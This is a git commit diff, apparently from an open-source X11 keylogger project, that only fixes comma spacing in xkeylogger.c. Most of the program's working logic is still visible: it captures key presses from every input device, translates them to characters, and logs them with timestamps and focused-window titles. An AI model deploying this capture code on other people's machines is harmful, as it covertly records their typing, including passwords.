0a049cf70f01e10bed3074f9a7654694c11837a9
Andrea Cardaci <cyrus.and@gmail.com>
2016-08-18 14:14:32 +0200

    Fix space around comma

--- xkeylogger.c
+++ xkeylogger.c
@@ -126,20 +126,20 @@ static void process_event( const struct keystroke_info *info )
 
     /* notify change of focus with timestamp (use title instead of window id to
        deal with "tabbed" apps like Chrome) */
-    if ( !current || strcmp( current , info->focused_window_name ) != 0 )
+    if ( !current || strcmp( current, info->focused_window_name ) != 0 )
     {
         free( current );
         current = strdup( info->focused_window_name );
 
         /* format timestamp */
-        strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
+        strftime( time_buf, 22, "%d/%m/%Y @ %H:%M:%S",
                   localtime( &info->timestamp ) );
 
-        printf( "\n" SEPARATOR_PREFIX " %s : %s\n" , time_buf ,
+        printf( "\n" SEPARATOR_PREFIX " %s : %s\n", time_buf,
                 info->focused_window_name );
     }
 
-    printf( "%s" , out );
+    printf( "%s", out );
     fflush( stdout );
 }
 #else
@@ -148,45 +148,45 @@ static void process_event( const struct keystroke_info *info )
     char time_buf[20];
 
     /* format timestamp */
-    strftime( time_buf , 20 , "%d/%m/%Y %H:%M:%S" ,
+    strftime( time_buf, 20, "%d/%m/%Y %H:%M:%S",
               localtime( &info->timestamp ) );
 
     /* dump keystroke info */
-    printf( "%s %c %c %c %c %c %c %c %i %s" ,
-            time_buf ,
-            info->modifier_mask & ShiftMask ? 'S' : 's' ,
-            info->modifier_mask & LockMask ? 'L' : 'l' ,
-            info->modifier_mask & ControlMask ? 'C' : 'c' ,
-            info->modifier_mask & Mod1Mask ? 'A' : 'a' , /* alt */
-            info->modifier_mask & Mod2Mask ? 'N' : 'n' , /* num lock */
-            info->modifier_mask & Mod4Mask ? 'W' : 'w' , /* windows */
-            info->modifier_mask & Mod5Mask ? 'G' : 'g' , /* alt gr */
-            info->original_keycode ,
+    printf( "%s %c %c %c %c %c %c %c %i %s",
+            time_buf,
+            info->modifier_mask & ShiftMask ? 'S' : 's',
+            info->modifier_mask & LockMask ? 'L' : 'l',
+            info->modifier_mask & ControlMask ? 'C' : 'c',
+            info->modifier_mask & Mod1Mask ? 'A' : 'a', /* alt */
+            info->modifier_mask & Mod2Mask ? 'N' : 'n', /* num lock */
+            info->modifier_mask & Mod4Mask ? 'W' : 'w', /* windows */
+            info->modifier_mask & Mod5Mask ? 'G' : 'g', /* alt gr */
+            info->original_keycode,
             XKeysymToString( info->original_keysym ) );
 
     /* dump translate keystroke (if available) */
     if ( info->translation_available )
     {
-        printf( " %s %s" ,
-                XKeysymToString( info->translated_keysym ) ,
+        printf( " %s %s",
+                XKeysymToString( info->translated_keysym ),
                 info->translated_char );
     }
 
     /* dump window name */
-    printf( " 0x%lx \"%s\"" , *info->focused_window , info->focused_window_name );
+    printf( " 0x%lx \"%s\"", *info->focused_window, info->focused_window_name );
 
     printf( "\n" );
     fflush( stdout );
 }
 #endif
 
-static void register_events( Display *display , Window root )
+static void register_events( Display *display, Window root )
 {
-    int i , n;
+    int i, n;
     XDeviceInfo *devices;
 
     /* get all input devices */
-    devices = XListInputDevices( display , &n );
+    devices = XListInputDevices( display, &n );
 
     for ( i = 0 ; i < n ; i++ )
     {
@@ -199,9 +199,9 @@ static void register_events( Display *display , Window root )
             XEventClass event_class;
 
             /* open device and register the event */
-            device = XOpenDevice( display , devices[i].id );
-            DeviceKeyPress( device , KEY_PRESS_TYPE , event_class );
-            XSelectExtensionEvent( display , root , &event_class , 1 );
+            device = XOpenDevice( display, devices[i].id );
+            DeviceKeyPress( device, KEY_PRESS_TYPE, event_class );
+            XSelectExtensionEvent( display, root, &event_class, 1 );
         }
     }
 
@@ -217,14 +217,14 @@ static XIC get_input_context( Display *display )
     XIC xic;
 
     /* open input method */
-    assert( xim = XOpenIM( display , NULL , NULL , NULL ) );
+    assert( xim = XOpenIM( display, NULL, NULL, NULL ) );
 
     /* fetch styles  */
-    assert( !XGetIMValues( xim , XNQueryInputStyle , &xim_styles , NULL ) );
+    assert( !XGetIMValues( xim, XNQueryInputStyle, &xim_styles, NULL ) );
     assert( xim_styles != NULL );
 
     /* search wanted style */
-    for ( xim_style = 0 , i = 0 ; i < xim_styles->count_styles ; i++ )
+    for ( xim_style = 0, i = 0 ; i < xim_styles->count_styles ; i++ )
     {
         if ( xim_styles->supported_styles[i] ==
              ( XIMPreeditNothing | XIMStatusNothing ) )
@@ -236,14 +236,14 @@ static XIC get_input_context( Display *display )
     assert( xim_style != 0 );
 
     /* create input context */
-    assert( xic = XCreateIC( xim , XNInputStyle , xim_style , NULL ) );
+    assert( xic = XCreateIC( xim, XNInputStyle, xim_style, NULL ) );
 
     XFree( xim_styles );
     return xic;
 }
 
-int translate_device_key_event( XIC xic , XDeviceKeyEvent *event ,
-                                KeySym *out_keysym , char *out_string )
+int translate_device_key_event( XIC xic, XDeviceKeyEvent *event,
+                                KeySym *out_keysym, char *out_string )
 {
     XKeyEvent key_event;
     Status status;
@@ -263,8 +263,8 @@ int translate_device_key_event( XIC xic , XDeviceKeyEvent *event ,
     key_event.same_screen = event->same_screen;
 
     /* translate the keystroke */
-    length = XmbLookupString( xic , &key_event , out_string , 4 ,
-                              out_keysym , &status );
+    length = XmbLookupString( xic, &key_event, out_string, 4,
+                              out_keysym, &status );
     if ( status == XLookupBoth )
     {
         out_string[length] = '\0';
@@ -274,34 +274,34 @@ int translate_device_key_event( XIC xic , XDeviceKeyEvent *event ,
     return 0;
 }
 
-int get_window_property( Display *display , Window window , const char *name , const char *type , void *data )
+int get_window_property( Display *display, Window window, const char *name, const char *type, void *data )
 {
     Atom name_atom;
     Atom type_atom;
     Atom actual_type;
-    int format , status;
-    unsigned long n_items , after;
+    int format, status;
+    unsigned long n_items, after;
 
     /* get atoms */
-    name_atom = XInternAtom( display , name , True );
-    type_atom = XInternAtom( display , type , True );
+    name_atom = XInternAtom( display, name, True );
+    type_atom = XInternAtom( display, type, True );
 
     /* get window property */
-    status = XGetWindowProperty( display , window , name_atom , False , 0xffff , False ,
-                                 type_atom , &actual_type , &format ,
-                                 &n_items , &after , ( unsigned char ** )data );
+    status = XGetWindowProperty( display, window, name_atom, False, 0xffff, False,
+                                 type_atom, &actual_type, &format,
+                                 &n_items, &after, ( unsigned char ** )data );
 
     return status == Success;
 }
 
-int get_window_name( Display *display , Window window , char **name )
+int get_window_name( Display *display, Window window, char **name )
 {
     if ( window )
     {
         int ret;
 
-        ret = get_window_property( display , window ,
-                                   "_NET_WM_NAME" , "UTF8_STRING" , name );
+        ret = get_window_property( display, window,
+                                   "_NET_WM_NAME", "UTF8_STRING", name );
 
         if ( ret && !*name ) *name = NO_TITLE;
         return ret;
@@ -314,16 +314,16 @@ int get_window_name( Display *display , Window window , char **name )
     }
 }
 
-int get_current_window( Display *display , Window **window )
+int get_current_window( Display *display, Window **window )
 {
     Window root;
 
     root = DefaultRootWindow( display );
-    return get_window_property( display , root ,
-                                "_NET_ACTIVE_WINDOW" , "WINDOW" , window );
+    return get_window_property( display, root,
+                                "_NET_ACTIVE_WINDOW", "WINDOW", window );
 }
 
-int main( int argc , char *argv[] )
+int main( int argc, char *argv[] )
 {
     Display *display;
     int screen;
@@ -331,21 +331,21 @@ int main( int argc , char *argv[] )
     XIC xic;
 
     /* open display */
-    if ( display = XOpenDisplay( NULL ) , !display )
+    if ( display = XOpenDisplay( NULL ), !display )
     {
-        fprintf( stderr , "Cannot open display" );
+        fprintf( stderr, "Cannot open display" );
         return EXIT_FAILURE;
     }
 
     /* get variables */
     screen = DefaultScreen( display );
-    root = RootWindow( display , screen );
+    root = RootWindow( display, screen );
 
     /* get input context */
     xic = get_input_context( display );
 
     /* register events for every keyboard */
-    register_events( display , root );
+    register_events( display, root );
 
     /* event loop */
     while ( 1 )
@@ -355,23 +355,23 @@ int main( int argc , char *argv[] )
         struct keystroke_info info;
 
         /* wait for the next event */
-        XNextEvent( display , &event );
+        XNextEvent( display, &event );
 
         /* fill keystroke info */
         device_event = ( XDeviceKeyEvent * )&event;
         info.timestamp = time( NULL );
         info.original_keycode = device_event->keycode;
         info.original_keysym =
-            XkbKeycodeToKeysym( display , device_event->keycode , 0 , 0 );
+            XkbKeycodeToKeysym( display, device_event->keycode, 0, 0 );
         info.modifier_mask = device_event->state;
-        get_current_window( display , &info.focused_window );
-        get_window_name( display , *info.focused_window , &info.focused_window_name );
+        get_current_window( display, &info.focused_window );
+        get_window_name( display, *info.focused_window, &info.focused_window_name );
 
         /* translate keystroke */
         info.translation_available =
-            translate_device_key_event( xic ,
-                                        device_event ,
-                                        &info.translated_keysym ,
+            translate_device_key_event( xic,
+                                        device_event,
+                                        &info.translated_keysym,
                                         info.translated_char );
 
         /* process the event */
